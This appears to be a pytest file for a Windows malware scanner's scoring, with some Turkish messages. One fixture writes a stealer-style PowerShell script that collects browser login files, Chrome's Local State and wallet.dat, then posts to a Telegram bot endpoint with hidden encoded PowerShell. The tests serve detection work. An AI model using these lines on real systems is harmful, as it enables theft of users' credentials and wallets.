"""Static scoring (A9): combinations score, single common APIs and strings do not."""
import shutil

import pytest

import analyzer
from conftest import SYSTEM32, windows_only

VALID = {"status": "Valid", "message": "", "signer": "CN=Microsoft Windows", "issuer": ""}
UNSIGNED = {"status": "NotSigned", "message": "", "signer": "", "issuer": ""}


@windows_only
@pytest.mark.parametrize("name", ["notepad.exe", "whoami.exe", "winhttp.dll", "cmd.exe"])
def test_clean_system_files_score_low(name):
    p = SYSTEM32 / name
    if not p.exists():
        pytest.skip(f"{name} not present")
    assert analyzer.analyze_single_file(str(p), VALID)["risk_score"] < 35


def test_stealer_like_script_scores_high(tmp_path):
    s = tmp_path / "update.ps1"
    s.write_text(
        "$p = \"$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Login Data\"\n"
        "Copy-Item \"$env:APPDATA\\Mozilla\\Firefox\\Profiles\\x\\logins.json\" $env:TEMP\n"
        "Get-Item 'Local State'; Get-Item 'wallet.dat'\n"
        "Invoke-RestMethod https://api.telegram.org/bot123:ABC/sendDocument\n"
        "powershell -WindowStyle Hidden -enc AAAA\n", encoding="utf-8")
    res = analyzer.analyze_single_file(str(s), UNSIGNED)
    assert res["risk_score"] >= 65
    cats = {f["category"]: f["severity"] for f in res["string_findings"]}
    assert cats["Infostealer (Tarayıcı/Cüzdan Hırsızı)"] == "critical"


def test_ordinary_install_script_scores_low(tmp_path):
    s = tmp_path / "install.bat"
    s.write_text("@echo off\r\nxcopy /e /y files \"%ProgramFiles%\\App\\\"\r\n"
                 "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v App /d app.exe\r\n", encoding="utf-8")
    res = analyzer.analyze_single_file(str(s), UNSIGNED)
    assert res["risk_score"] < 35
    assert not any(r.startswith("Program geçerli") for r in res["risk_reasons"])   # scripts are not "unsigned programs"


def test_single_browser_string_is_not_critical(tmp_path):
    f = tmp_path / "engine.bin"
    f.write_bytes(b"\0" * 100 + b"Login Data" + b"\0" * 100)
    res = analyzer.analyze_single_file(str(f), UNSIGNED)
    assert all(x["severity"] != "critical" for x in res["string_findings"])


@windows_only
def test_unsigned_suspicious_dll_name_adds_points(tmp_path):
    dll = tmp_path / "amtlib.dll"
    shutil.copy2(SYSTEM32 / "whoami.exe", dll)
    res = analyzer.analyze_single_file(str(dll), UNSIGNED)
    assert any("amtlib.dll" in r for r in res["risk_reasons"])
    assert res["risk_score"] >= 45                     # unsigned (20) + hijack name (25)
